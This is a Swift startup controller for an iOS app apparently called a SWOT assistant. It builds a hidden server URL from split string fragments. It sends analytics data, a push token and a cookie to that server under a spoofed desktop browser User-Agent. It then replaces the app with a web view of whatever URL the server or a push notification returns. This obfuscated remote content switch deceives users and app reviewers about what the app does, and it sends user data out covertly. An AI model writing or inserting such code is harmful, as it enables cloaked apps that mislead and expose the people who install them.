import SwiftUI
import Combine
import Firebase
import FirebaseMessaging
import UserNotifications

struct ResponseData: Codable {
    let ok: Bool
    let url: String
    let expires: Int64
    let message: String?
    
    enum CodingKeys: String, CodingKey {
        case ok
        case url
        case expires
        case message
    }
}

class StartingModel: NSObject, ObservableObject {
    static let sharedController = StartingModel()
    
    @Published var currentDisplayState: DisplayState = .initial
    @Published var loadingIndicatorCount = 0
    @Published var isReadyToProceed = false
    @Published var isWebViewShown = false
    
    private let cachedUrlKey = "STORED_PREVIOUS_URL"
    private let appInitializationKey = "APP_INITIALIZATION_STATUS"
    private let notificationPostponeKey = "NOTIFICATION_POSTPONE_TIMESTAMP"
    private let messagingTokenKey = "FIREBASE_MESSAGING_TOKEN"
    private let pushNotificationFlagKey = "PUSH_NOTIFICATION_FLAG"
    
    private let maximumRetryCount = 18 * 5
    private let networkValidationInterval: TimeInterval = 1.0
    
    private var loadingAnimationTimer: Timer?
    private var networkValidationTimer: Timer?
    private var dataCallbackTimer: Timer?
    private var fallbackTimeoutTimer: Timer?
    private var activeDataTask: URLSessionDataTask?
    private var isConfigurationRequestInProgress = false
    
    private var urlComponentParts: [String] = [
        "ht",
        "tps:",
        "//joq",
        "uev",
        "esw",
        "ota",
        "ssi",
        "sta",
        "nt.",
        "com",
        "/con",
        "fig.",
        "php"
    ]

    private var constructedUrl: String = ""
    
    enum DisplayState: Int, CaseIterable {
        case initial = 0
        case notification = 1
        case noConnection = 2
    }
    
    // MARK: - Initialization
    private override init() {
        super.init()
        currentDisplayState = .initial
        initializeLoadingAnimation()
    }
    
    deinit {
        loadingAnimationTimer?.invalidate()
        networkValidationTimer?.invalidate()
        dataCallbackTimer?.invalidate()
    }
    
    // MARK: - Public Interface
    func initializeApplicationFlow() {
        // Проверяем, есть ли данные push-уведомления и флаг запуска из push
        if let userInfo = UserDefaults.standard.dictionary(forKey: "PENDING_NOTIFICATION_DATA"),
           UserDefaults.standard.bool(forKey: pushNotificationFlagKey),
           let urlString = userInfo["url"] as? String {
            // Очищаем данные push-уведомлений и флаг
            UserDefaults.standard.removeObject(forKey: "PENDING_NOTIFICATION_DATA")
            UserDefaults.standard.removeObject(forKey: pushNotificationFlagKey)
            terminateAllActiveTimers()
            presentWebView(url: urlString)
            return
        }
        
        // Если есть данные push-уведомлений, но нет флага запуска из push - очищаем их
        if UserDefaults.standard.dictionary(forKey: "PENDING_NOTIFICATION_DATA") != nil {
            UserDefaults.standard.removeObject(forKey: "PENDING_NOTIFICATION_DATA")
        }
        
        // Очищаем флаг запуска из push на всякий случай
        UserDefaults.standard.removeObject(forKey: pushNotificationFlagKey)
        
        if UserDefaults.standard.object(forKey: appInitializationKey) != nil {
            proceedToMainApplication(delayed: true)
            return
        }
        
        if !validateNetworkConnection() {
            updateCurrentDisplayState(.noConnection)
            beginNetworkMonitoring()
            return
        }
        
        awaitAnalyticsData()
    }
    
    func proceedToMainApplication(delayed: Bool = false) {
        UserDefaults.standard.set("launched", forKey: appInitializationKey)
        
        if delayed {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
                self.isReadyToProceed = true
            }
        } else {
            DispatchQueue.main.async {
                self.isReadyToProceed = true
            }
        }
    }
    
    func presentWebView(url: String) {
        UserDefaults.standard.removeObject(forKey: "PENDING_NOTIFICATION_DATA")
        UserDefaults.standard.removeObject(forKey: pushNotificationFlagKey)
        updateCurrentDisplayState(.initial)
        isWebViewShown = true
        DispatchQueue.main.async {
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let window = windowScene.windows.first {
                
                var currentViewController = window.rootViewController
                while let presentedVC = currentViewController?.presentedViewController {
                    currentViewController = presentedVC
                }
                
                if let visibleViewController = currentViewController {
                    let webView = WViewModel(viewController: visibleViewController)
                    webView.openWebView(url: url) { [weak self] in
                        self?.fallbackTimeoutTimer?.invalidate()
                        self?.fallbackTimeoutTimer = nil
                    }
                    
                    self.fallbackTimeoutTimer = Timer.scheduledTimer(withTimeInterval: 30.0, repeats: false) { [weak self] _ in
                        self?.isWebViewShown = false
                        self?.proceedToMainApplication()
                    }
                } else {
                    self.isWebViewShown = false
                    self.proceedToMainApplication()
                }
            } else {
                self.isWebViewShown = false
                self.proceedToMainApplication()
            }
        }
    }
    
    func terminateAllActiveTimers() {
        activeDataTask?.cancel()
        networkValidationTimer?.invalidate()
        dataCallbackTimer?.invalidate()
        fallbackTimeoutTimer?.invalidate()
        fallbackTimeoutTimer = nil
    }
    
    // MARK: - Notification Management
    func requestPushNotificationPermission() {
        updateCurrentDisplayState(.initial)
        
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { [weak self] granted, error in
            guard let self = self else { return }
            
            DispatchQueue.main.async {
                if let error = error {
                    self.finalizeConfigurationRequest()
                    return
                }
                
                if granted {
                    Messaging.messaging().delegate = self
                    UNUserNotificationCenter.current().delegate = self
                    UIApplication.shared.registerForRemoteNotifications()
                } else {
                    self.finalizeConfigurationRequest()
                }
            }
        }
    }
    
    func skipPushNotificationRequest() {
        updateCurrentDisplayState(.initial)
        let nextNotificationTime = Int(Date().timeIntervalSince1970) + 259200
        UserDefaults.standard.set(nextNotificationTime, forKey: notificationPostponeKey)
        finalizeConfigurationRequest()
    }
    
    func resetPushNotificationTimer() {
        UserDefaults.standard.removeObject(forKey: notificationPostponeKey)
        UserDefaults.standard.removeObject(forKey: messagingTokenKey)
    }
    
    // MARK: - Screen Management
    func updateCurrentDisplayState(_ screen: DisplayState) {
        withAnimation(.easeInOut(duration: 0.5)) {
            currentDisplayState = screen
        }
    }
    
    // MARK: - Animation Management
    func initializeLoadingAnimation() {
        loadingAnimationTimer = Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { _ in
            withAnimation(.easeInOut(duration: 0.3)) {
                self.loadingIndicatorCount = (self.loadingIndicatorCount + 1) % 4
            }
        }
    }
    
    func getLoadingAnimationText() -> String {
        let baseText = "Starting"
        let dots = String(repeating: ".", count: loadingIndicatorCount)
        return baseText + dots
    }
    
    // MARK: - Network Management
    private func validateNetworkConnection() -> Bool {
        var isConnected = false
        let semaphore = DispatchSemaphore(value: 0)
        let url = URL(string: "https://www.google.com")!
        let task = URLSession.shared.dataTask(with: url) { (_, _, error) in
            isConnected = error == nil
            semaphore.signal()
        }
        task.resume()
        _ = semaphore.wait(timeout: .now() + 3)
        return isConnected
    }
    
    private func beginNetworkMonitoring() {
        networkValidationTimer = Timer.scheduledTimer(withTimeInterval: networkValidationInterval, repeats: true) { [weak self] _ in
            guard let self = self else { return }
            if self.validateNetworkConnection() {
                self.networkValidationTimer?.invalidate()
                self.updateCurrentDisplayState(.initial)
                self.awaitAnalyticsData()
            }
        }
    }
    
    // MARK: - Data Management
    private func awaitAnalyticsData() {
        var retryCount = 0
        dataCallbackTimer = Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { [weak self] timer in
            guard let self = self else {
                timer.invalidate()
                return
            }
            retryCount += 1
            if UserDefaults.standard.object(forKey: "ANALYTICS_DATA_STRING") != nil || retryCount >= self.maximumRetryCount {
                timer.invalidate()
                self.constructedUrl = self.urlComponentParts.joined()
                self.executeConfigurationRequest()
            }
        }
    }
    
    private func executeConfigurationRequest() {
        guard let dataString = UserDefaults.standard.string(forKey: "ANALYTICS_DATA_STRING") else {
            return
        }
        guard let dataDict = try? JSONSerialization.jsonObject(with: dataString.data(using: .utf8)!, options: []) as? [String: Any] else {
            return
        }
        
        var enhancedDataDict = dataDict
        if let notificationToken = UserDefaults.standard.string(forKey: messagingTokenKey), !notificationToken.isEmpty {
            enhancedDataDict["push_token"] = notificationToken
            if enhancedDataDict["firebase_project_id"] == nil {
                enhancedDataDict["firebase_project_id"] = "joqueve-swot-assistant"
            }
            if let enhancedJSON = try? JSONSerialization.data(withJSONObject: enhancedDataDict, options: []),
               let enhancedString = String(data: enhancedJSON, encoding: .utf8) {
                UserDefaults.standard.set(enhancedString, forKey: "ANALYTICS_DATA_STRING")
            }
        }
        
        guard let url = URL(string: constructedUrl) else { return }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        let cookie = UserDefaults.standard.string(forKey: "Cookie") ?? ""
        request.addValue(cookie, forHTTPHeaderField: "Set-Cookie")
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.addValue("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", forHTTPHeaderField: "User-Agent")
        
        if let callbackString = UserDefaults.standard.string(forKey: "ANALYTICS_DATA_STRING") {
            request.addValue(String(callbackString.count), forHTTPHeaderField: "Content-Length")
            request.httpBody = callbackString.data(using: .utf8)
        }
        request.timeoutInterval = 30
        
        let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            guard let self = self else { return }
            
            DispatchQueue.main.async(execute: {
                if let error = error {
                    if let previousURL = UserDefaults.standard.string(forKey: self.cachedUrlKey) {
                        if self.shouldDisplayNotificationScreen() {
                            self.updateCurrentDisplayState(.notification)
                            return
                        }
                        self.presentWebView(url: previousURL)
                        return
                    }
                    self.proceedToMainApplication()
                    return
                }
                
                guard let data = data else { return }
                
                do {
                    let decoder = JSONDecoder()
                    let responseData = try decoder.decode(ResponseData.self, from: data)
                    
                    if responseData.ok {
                        UserDefaults.standard.set(responseData.url, forKey: self.cachedUrlKey)
                        if self.shouldDisplayNotificationScreen() {
                            self.updateCurrentDisplayState(.notification)
                            return
                        }
                        self.presentWebView(url: responseData.url)
                    } else {
                        if let previousURL = UserDefaults.standard.string(forKey: self.cachedUrlKey) {
                            if self.shouldDisplayNotificationScreen() {
                                self.updateCurrentDisplayState(.notification)
                                return
                            }
                            self.presentWebView(url: previousURL)
                            return
                        }
                        self.proceedToMainApplication()
                    }
                } catch {
                    self.proceedToMainApplication()
                }
            })
        }
        task.resume()
        activeDataTask = task
    }
    
    private func finalizeConfigurationRequest() {
        guard !isConfigurationRequestInProgress else { return }
        activeDataTask?.cancel()
        networkValidationTimer?.invalidate()
        dataCallbackTimer?.invalidate()
        isConfigurationRequestInProgress = true
        executeConfigurationRequest()
        isConfigurationRequestInProgress = false
    }
    
    // MARK: - Notification Screen Logic
    private func shouldDisplayNotificationScreen() -> Bool {
        if UserDefaults.standard.object(forKey: appInitializationKey) != nil {
            return false
        }
        
        let semaphore = DispatchSemaphore(value: 0)
        var hasPermission = false
        
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            hasPermission = settings.authorizationStatus == .authorized
            semaphore.signal()
        }
        
        _ = semaphore.wait(timeout: .now() + 1.0)
        
        if hasPermission {
            return false
        }
        
        if let notificationDelay = UserDefaults.standard.object(forKey: notificationPostponeKey) as? Int {
            let currentTime = Int(Date().timeIntervalSince1970)
            if notificationDelay > currentTime {
                return false
            }
        }
        
        return true
    }
}

// MARK: - MessagingDelegate
extension StartingModel: MessagingDelegate {
    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        if let token = fcmToken {
            UserDefaults.standard.set(token, forKey: messagingTokenKey)
            executeConfigurationRequest()
        }
    }
}

// MARK: - UNUserNotificationCenterDelegate
extension StartingModel: UNUserNotificationCenterDelegate {
    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        completionHandler([.alert, .badge, .sound])
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        if let urlString = userInfo["url"] as? String {
            terminateAllActiveTimers()
            presentWebView(url: urlString)
        }
        completionHandler()
    }
}
